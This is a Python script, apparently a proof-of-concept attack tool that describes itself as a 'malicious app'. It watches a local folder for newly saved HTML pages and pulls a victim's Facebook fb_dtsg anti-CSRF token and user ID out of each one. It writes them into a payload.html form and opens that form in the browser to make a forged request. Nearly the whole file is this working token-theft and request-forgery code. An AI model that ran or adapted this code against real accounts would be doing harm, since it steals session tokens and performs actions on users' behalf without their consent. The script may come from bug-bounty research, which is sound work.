import time, os
from watchdog.observers import Observer
from bs4 import BeautifulSoup
from watchdog.events import LoggingEventHandler
import webbrowser

def ReadFile(path, showError=False):
	try:
		f = open(path, "r") 
		return f
		f.close()
	except Exception as e:
		raise ValueError(str(e))

def WriteFile(path, content):
    k = open(path, "w+")
    k.write(content)
    k.close()

class Event(LoggingEventHandler):
    def dispatch(self, event): 
        if not event.is_directory and event.src_path.split(".")[-1] in ["html"] and event.event_type=='created':
            soup = BeautifulSoup(ReadFile(event.src_path, True),'lxml')
            print("Malicious App Looking for new files in download folder.....")
            try:
                SoupData = str(soup.find_all('script')[4])
                victim_dtsg_token = SoupData.split('DTSGInitialData",[],{"token":"')[1][0:25]
                victim_UserId = SoupData.split('USER_ID":"')[1].split('"')[0]
                payloadFile = BeautifulSoup(ReadFile('payload.html'),'lxml')
                payloadFile.find("input", {"name":"fb_dtsg"})['value'] = victim_dtsg_token
                payloadFile.find("input", {"name":"__user"})['value'] = victim_UserId 
                WriteFile('payload.html', str(payloadFile))
                print('Opening '+os.getcwd()+'/payload.html')
                webbrowser.open("file://"+os.getcwd()+'/payload.html')
                print("New file detected..."+str(event.src_path))
            except Exception as e:
                print(str(e))
                pass

path = '/Users/rohitcoder/Desktop'
event_handler = Event()
observer = Observer()
observer.schedule(event_handler, path, recursive=True)
observer.start()
try:
    while True:
        time.sleep(1)
finally:
    observer.stop()
    observer.join()